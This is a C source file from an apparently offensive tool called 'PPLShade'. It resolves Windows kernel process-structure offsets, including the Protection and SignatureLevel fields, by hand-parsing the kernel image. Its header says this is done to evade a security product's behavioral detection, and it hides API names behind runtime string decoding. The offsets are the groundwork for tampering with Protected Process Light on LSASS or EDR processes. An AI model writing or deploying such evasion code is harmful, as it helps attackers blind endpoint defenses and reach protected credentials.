/*
 *  PPLShade - kstruct_resolve.c
 *  Dynamic kernel structure field resolution.
 *  Uses manual PE parsing (ReadFile + export walk) instead of
 *  LoadLibraryEx to avoid S1 behavioral detection.
 */

#include "kstruct_resolve.h"
#include "pe_parse.h"
#include "strob.h"

DWORD64 QueryNtBase(void) {
    LPVOID* lpBase = NULL;
    DWORD dwNeeded = 0;

    HMODULE hP = LoadLibraryA("psapi.dll");
    if (!hP) return 0;

    fn_EnumDD pFn = (fn_EnumDD)GetProcAddress(hP, "EnumDeviceDrivers");
    if (!pFn) { FreeLibrary(hP); return 0; }

    if (!pFn(NULL, 0, &dwNeeded)) { FreeLibrary(hP); return 0; }

    lpBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwNeeded);
    if (!lpBase) { FreeLibrary(hP); return 0; }

    if (!pFn(lpBase, dwNeeded, &dwNeeded)) {
        HeapFree(GetProcessHeap(), 0, lpBase);
        FreeLibrary(hP);
        return 0;
    }

    DWORD64 base = (DWORD64)lpBase[0];
    HeapFree(GetProcessHeap(), 0, lpBase);
    FreeLibrary(hP);
    return base;
}

static HMANUAL_PE LoadKImage(void) {
    char sysDir[MAX_PATH] = { 0 };
    GetSystemDirectoryA(sysDir, MAX_PATH);

    char path[MAX_PATH] = { 0 };
    char n[16] = { 0 };
    DEC_NTK(n);
    sprintf_s(path, MAX_PATH, "%s\\%s", sysDir, n);
    SecureZeroMemory(n, sizeof(n));

    HMANUAL_PE hPe = ManualPeLoad(path);
    SecureZeroMemory(path, sizeof(path));
    if (!hPe) error("Init failed [1]");
    return hPe;
}

static FARPROC RslvExp(HMANUAL_PE hPe, const unsigned char* enc, int len) {
    char n[64] = { 0 };
    _xd(n, enc, len);
    FARPROC p = ManualPeGetExport(hPe, n);
    SecureZeroMemory(n, sizeof(n));
    return p;
}

static BOOL FindF0(HMANUAL_PE hPe, PDWORD p) {
    FARPROC f = RslvExp(hPe, _e3, 14);
    if (!f) { error("R0"); return FALSE; }
    WORD w = 0;
    memcpy(&w, (PVOID)((ULONG_PTR)f + 3), sizeof(WORD));
    if (w > 0x0FFF) { error("R0 OOB"); return FALSE; }
    
    *p = w;
    return TRUE;
}

static BOOL FindF1(DWORD pid, PDWORD p) {
    *p = pid + sizeof(HANDLE);
    return TRUE;
}

static BOOL FindF2(HMANUAL_PE hPe, PDWORD p) {
    FARPROC a = RslvExp(hPe, _e4, 20);
    FARPROC b = RslvExp(hPe, _e5, 25);
    if (!a || !b) { error("R2"); return FALSE; }
    WORD wA = 0, wB = 0;
    memcpy(&wA, (PVOID)((ULONG_PTR)a + 2), sizeof(WORD));
    memcpy(&wB, (PVOID)((ULONG_PTR)b + 2), sizeof(WORD));
    if (wA != wB || wA > 0x0FFF) { error("R2 mismatch"); return FALSE; }
    
    *p = wA;
    return TRUE;
}

static BOOL FindF3(DWORD prot, PDWORD p) { *p = prot - 2; return TRUE; }
static BOOL FindF4(DWORD prot, PDWORD p) { *p = prot - 1; return TRUE; }

static BOOL FindF5(HMANUAL_PE hPe, PDWORD p) {
    FARPROC f = RslvExp(hPe, _e2, 22);
    if (!f) { error("R5"); return FALSE; }
    *p = (DWORD)((ULONG_PTR)f - (ULONG_PTR)hPe->Base);
    return TRUE;
}

static BOOL FindF6(HMANUAL_PE hPe, PDWORD p) {
    // PsGetProcessImageFileName: lea rax, [rcx+OFFSET] → 48 8D 81 XX XX XX XX
    FARPROC f = RslvExp(hPe, _e6, 25);
    if (!f) { error("R6"); return FALSE; }
    BYTE* pFunc = (BYTE*)f;
    // Check for LEA RAX, [RCX+disp32]: 48 8D 81
    if (pFunc[0] == 0x48 && pFunc[1] == 0x8D && pFunc[2] == 0x81) {
        DWORD off = 0;
        memcpy(&off, pFunc + 3, sizeof(DWORD));
        if (off > 0x0FFF) { error("R6 OOB"); return FALSE; }
        *p = off;
        return TRUE;
    }
    // Fallback: LEA RAX, [RCX+disp8]: 48 8D 41 XX
    if (pFunc[0] == 0x48 && pFunc[1] == 0x8D && pFunc[2] == 0x41) {
        *p = (DWORD)pFunc[3];
        return TRUE;
    }
    // Fallback: ADD RCX, disp32 + MOV RAX, RCX: 48 81 C1 XX XX XX XX
    if (pFunc[0] == 0x48 && pFunc[1] == 0x81 && pFunc[2] == 0xC1) {
        DWORD off = 0;
        memcpy(&off, pFunc + 3, sizeof(DWORD));
        if (off > 0x0FFF) { error("R6 OOB"); return FALSE; }
        *p = off;
        return TRUE;
    }
    error("R6 unknown pattern: %02X %02X %02X", pFunc[0], pFunc[1], pFunc[2]);
    return FALSE;
}

BOOL ResolveKernelStructs(DWORD offsets[KF_MAX]) {
    HMANUAL_PE hK = LoadKImage();
    if (!hK) return FALSE;

    BOOL ok = FALSE;
    do {
        if (!FindF5(hK, &offsets[KF_SYSTEM_INITIAL_PROC])) break;
        if (!FindF0(hK, &offsets[KF_UNIQUE_PID])) break;
        if (!FindF1(offsets[KF_UNIQUE_PID], &offsets[KF_ACTIVE_LINKS])) break;
        if (!FindF2(hK, &offsets[KF_PROTECTION])) break;
        if (!FindF3(offsets[KF_PROTECTION], &offsets[KF_SIG_LEVEL])) break;
        if (!FindF4(offsets[KF_PROTECTION], &offsets[KF_SEC_SIG_LEVEL])) break;
        if (!FindF6(hK, &offsets[KF_IMAGE_FILE_NAME])) break;
        ok = TRUE;
    } while (0);

    ManualPeFree(hK);
    if (ok) okay("Ready");
    else    error("Init failed");
    return ok;
}
